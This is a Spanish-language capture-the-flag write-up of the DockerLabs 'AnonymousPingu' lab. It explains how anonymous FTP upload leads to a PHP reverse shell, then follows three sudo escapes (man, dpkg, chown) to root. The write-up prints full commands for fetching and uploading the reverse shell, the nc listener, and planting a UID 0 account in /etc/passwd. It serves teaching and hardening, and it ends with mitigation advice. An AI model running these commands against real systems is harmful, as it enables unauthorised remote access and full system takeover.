# AnonymousPingu (DockerLabs) — Writeup

Dificultad: fácil

Si tuviera que resumir esta máquina en una frase, sería: "una cadena de sudo mal configurada puede convertirse literalmente en una escalera humana hasta root". Aquí no hay un solo salto de privilegios, sino tres seguidos, cada uno pasando el testigo a un usuario distinto, hasta llegar arriba del todo. Es de las máquinas más didácticas para entender por qué revisar `sudo -l` no es un paso que se hace una vez y se olvida — hay que repetirlo cada vez que se cambia de usuario.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

El acceso inicial es prácticamente un clásico ya visto en otras máquinas: FTP anónimo que expone el código fuente de la web, y un directorio de subida con permisos de escritura abierto de par en par. Lo interesante empieza después, en la escalada: en vez de un único salto a root, hay que encadenar tres binarios distintos con permisos de sudo mal configurados, cada uno abriendo la puerta al siguiente usuario, hasta terminar fabricando una cuenta de root propia en `/etc/passwd`.

---

## Paso 1: reconocimiento de puertos

```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```

```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
80/tcp open  http    syn-ack
```

Con los dos puertos identificados, se profundiza con detección de versiones y scripts por defecto:

```bash
nmap -sCV -p21,80 172.17.0.2 -oN targeted.txt
```

```
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
...
|_drwxrwxrwx    1 33       33              0 Apr 28 21:08 upload [NSE: writeable]
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
|_http-title: Mantenimiento
```

El propio Nmap, gracias al script `ftp-anon`, ya adelanta dos datos cruciales antes incluso de conectarse manualmente: el login anónimo está habilitado, y existe un directorio `upload` con permisos de escritura para todo el mundo (`drwxrwxrwx`).

---

## Paso 2: confirmando lo que Nmap ya adelantó

Conectando por FTP con el usuario anónimo, se comprueba que el listado de archivos coincide exactamente con el contenido servido por la web en el puerto 80 — `index.html`, `about.html`, `contact.html`, hojas de estilo, imágenes. Es decir, el FTP no es un servicio independiente con sus propios archivos: es literalmente la misma raíz de documentos del servidor Apache, expuesta también por FTP sin ningún control de acceso adicional.

Y ahí, entre los archivos, está `/upload`, marcado con permisos de escritura totales. Si ese directorio es accesible también desde la web (algo bastante probable, dado que comparte raíz con el resto del sitio), tenemos un canal directo para colocar y ejecutar un archivo malicioso.

---

## Paso 3: subir la reverse shell por la puerta de atrás

Se descarga la clásica reverse shell de PentestMonkey, ampliamente usada en este tipo de retos por su fiabilidad:

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
mv php-reverse-shell.php shell.php
```

Antes de subirla, se edita el archivo para apuntar la IP y el puerto de escucha a la máquina atacante. Con eso listo, se sube vía FTP directamente al directorio con permisos de escritura:

```bash
ftp 172.17.0.2
# usuario: anonymous
cd upload/
put shell.php
```

Se levanta el listener:

```bash
sudo nc -nlvp 443
```

Y se dispara la ejecución simplemente visitando la ruta desde el navegador:

```
http://172.17.0.2/upload/shell.php
```

Con la conexión entrante confirmada, toca el paso obligatorio antes de seguir: tratamiento de la TTY (script + stty + reset + variables de entorno) para tener una terminal cómoda de verdad.

---

## Paso 4: el primer salto — de www-data a pingu

```bash
sudo -l
```

```
User www-data may run the following commands on 13d79de146ba:
    (pingu) NOPASSWD: /usr/bin/man
```

Aquí aparece el primer eslabón de la cadena: `www-data` puede ejecutar `man` como el usuario **pingu**, sin contraseña. El manual de páginas de Unix (`man`) tiene una característica poco conocida por quien no lo usa a diario: al mostrar una página de manual, internamente invoca un paginador (normalmente `less`), y desde ese paginador es posible escapar a una shell del sistema con el comando `!`, heredando los privilegios con los que se ejecutó `man`.

```bash
sudo -u pingu man man
```

Dentro del paginador:

```
!/bin/bash
```

```bash
whoami
# pingu
```

Salto completado. Ya no somos `www-data`, somos `pingu`.

---

## Paso 5: el segundo salto — de pingu a gladys

La clave de esta máquina es no dar por finalizada la escalada tras el primer salto: hay que repetir la comprobación de sudo con cada nuevo usuario que se consiga.

```bash
sudo -l
```

```
User pingu may run the following commands on 4af23574d013:
    (gladys) NOPASSWD: /usr/bin/nmap
    (gladys) NOPASSWD: /usr/bin/dpkg
```

Dos opciones esta vez, y ambas llevan al mismo destino: el usuario **gladys**. Se opta por `dpkg`, el gestor de paquetes de sistemas basados en Debian, que en determinadas configuraciones también permite invocar comandos externos durante su ejecución (por ejemplo, a través de scripts de mantenimiento de paquetes), una técnica igualmente documentada en GTFOBins.

```bash
sudo -u gladys dpkg -l
```

Desde ahí, siguiendo el mismo patrón de escape, se obtiene una shell:

```
!/bin/bash
```

Segundo salto completado. Ahora somos `gladys`.

---

## Paso 6: el salto final — de gladys a root, sin editor de texto disponible

Repitiendo la comprobación una vez más:

```bash
sudo -l
```

```
User gladys may run the following commands on 4af23574d013:
    (root) NOPASSWD: /usr/bin/chown
```

Aquí el reto cambia de naturaleza. `chown` no es un binario que permita abrir una shell directamente — simplemente cambia el propietario de un archivo. Pero eso, en manos equivocadas, es más que suficiente: si se puede cambiar el propietario de un archivo crítico del sistema como `/etc/passwd`, se puede después modificarlo libremente con los propios permisos de usuario normal, sin necesidad de tener privilegios de root para escribir en él.

```bash
sudo chown $(id -un):$(id -gn) /etc/passwd
```

Con `/etc/passwd` ahora perteneciendo a `gladys`, el archivo es editable sin restricciones adicionales. El plan inicial sería simplemente quitar la `x` del campo de contraseña de root para permitir login sin clave — pero en este sistema no hay ningún editor de texto instalado (ni vim, ni nano), así que hace falta un enfoque distinto: fabricar un usuario nuevo con UID 0 directamente mediante redirección de shell.

Primero, generar un hash de contraseña válido:

```bash
openssl passwd hola123
```

Y añadir la línea correspondiente al final de `/etc/passwd`:

```bash
echo 'newroot:$1$EBhVbkUV$zW3uLFiknxfdzUV5OjQZ40:0:0::/home/newroot:/bin/bash' >> /etc/passwd
```

El formato sigue el estándar `usuario:hash:UID:GID:comentario:home:shell`, y de nuevo el detalle que importa es **UID 0**: da igual que el usuario se llame `newroot` en vez de `root`, el sistema lo trata como administrador absoluto.

```bash
su newroot
whoami
# root
```

Tercer y último salto completado. Root conseguido tras tres escalones consecutivos de sudo mal configurado.

---

## Resumen técnico

| Fase | Detalle |
|---|---|
| Acceso inicial | FTP anónimo con directorio `/upload` escribible |
| Vector de entrada | Reverse shell PHP subida vía FTP, ejecutada vía web |
| Usuario inicial | www-data |
| Salto 1 | www-data → pingu, vía `sudo man` (escape con `!`) |
| Salto 2 | pingu → gladys, vía `sudo dpkg` (escape de intérprete) |
| Salto 3 | gladys → root, vía `sudo chown` sobre `/etc/passwd` |
| Técnica final | Creación de usuario con UID 0 sin necesidad de editor de texto |

---

## Qué falló aquí (y cómo se evita)

1. **FTP anónimo compartiendo raíz de documentos con la web, y un directorio escribible por cualquiera.** Cualquier directorio con permisos de escritura accesible desde un servicio expuesto es, en la práctica, un punto de subida de código arbitrario si ese mismo directorio es también servido por el aplicativo web.
2. **Cadena completa de reglas de sudo mal delimitadas.** El fallo real aquí no es un único binario mal configurado, sino un patrón repetido tres veces: cada usuario podía ejecutar como otro usuario un binario capaz de escapar a una shell o de comprometer archivos críticos del sistema. Ninguna regla de sudo debería concederse sin comprobar antes en GTFOBins si el binario en cuestión permite este tipo de escape.
3. **Permiso de sudo sobre `chown` sin restricción de rutas.** Conceder `chown` como root sin limitar sobre qué archivos puede aplicarse (por ejemplo, restringiéndolo a un directorio específico) permite alterar la propiedad de cualquier archivo del sistema, incluidos los más sensibles como `/etc/passwd` o `/etc/shadow`.

---

## Referencias

- GTFOBins — man: https://gtfobins.github.io/gtfobins/man/
- GTFOBins — dpkg: https://gtfobins.github.io/gtfobins/dpkg/
- GTFOBins — chown: https://gtfobins.github.io/gtfobins/chown/
- PentestMonkey PHP reverse shell: https://github.com/pentestmonkey/php-reverse-shell
- DockerLabs: https://dockerlabs.es/
